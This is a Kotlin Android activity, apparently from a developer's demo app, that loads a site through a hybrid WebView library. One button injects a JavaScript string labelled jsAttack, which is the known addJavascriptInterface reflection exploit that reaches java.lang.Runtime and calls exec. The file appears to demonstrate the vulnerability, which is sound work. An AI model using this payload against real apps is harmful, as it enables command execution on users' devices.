package com.jiangkang.ktools.web

import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import com.jiangkang.hybrid.Khybrid
import com.jiangkang.ktools.R
import com.jiangkang.ktools.databinding.ActivityHybridBinding
import kotlinx.android.synthetic.main.activity_hybrid.*

class HybridActivity : AppCompatActivity() {

    private lateinit var binding:ActivityHybridBinding
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityHybridBinding.inflate(layoutInflater)
        setContentView(binding.root)
        handleClick()
    }

    private fun handleClick() {

        binding.btnResourceInterceptor.setOnClickListener {
            Khybrid()
                    .isInterceptResources(true)
                    .loadUrl(this, "https://www.jiangkang.tech")
        }

        binding.btnImgLazyLoading.setOnClickListener {
            Khybrid()
                    .isLoadImgLazy(true)
                    .loadUrl(this, "https://www.jiangkang.tech")
        }


        binding.btnJsInject.setOnClickListener {
            val jsAttack = """
                (function(){
                    for (var obj in window) {
                        if ("getClass" in window[obj]) {
                             alert(obj);
                            return  window[obj].getClass().forName("java.lang.Runtime")
                                     .getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
                        }
                    }
                })();
                """
            Khybrid()
                    .injectJs(jsAttack)
                    .loadUrl(this, "https://www.jiangkang.tech")

        }


    }
}
